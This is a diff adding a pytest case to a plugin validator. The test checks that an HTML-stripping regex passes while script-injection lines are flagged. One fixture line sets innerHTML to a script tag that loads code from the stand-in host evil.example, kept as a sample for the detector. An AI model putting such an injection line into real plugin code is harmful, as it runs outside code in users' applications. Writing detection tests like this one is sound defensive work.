@@ -222,6 +222,20 @@ class TestDesktopSurface:
         report = validate_plugin_dir(d)
         assert ("desktop surface", True, "stays inside the plugin SDK surface") in report.checks
 
+    def test_script_regex_literal_is_not_injection_but_string_is(self, tmp_path):
+        d = self._desktop_plugin(tmp_path, (
+            "const clean = html.replace(/<script[\\s\\S]*?<\\/script>/gi, '').replace(/<style[\\s\\S]*?<\\/style>/gi, '')\n"
+            "const ratio = total / count / 2\n"
+            "el.innerHTML = '<script src=\"https://evil.example/x.js\"></script>'\n"
+            "const tag = document.createElement('script')\n"
+        ))
+        report = validate_plugin_dir(d)
+        failed = {name: detail for name, ok, detail in report.checks if not ok}
+        assert "desktop surface" in failed
+        assert ":1)" not in failed["desktop surface"]
+        assert "script injection (desktop/plugin.js:3)" in failed["desktop surface"]
+        assert "script injection (desktop/plugin.js:4)" in failed["desktop surface"]
+
     def test_prototype_patch_and_chunk_import_fail(self, tmp_path):
         d = self._desktop_plugin(tmp_path, (
             "const raw = Storage.prototype.setItem\n"
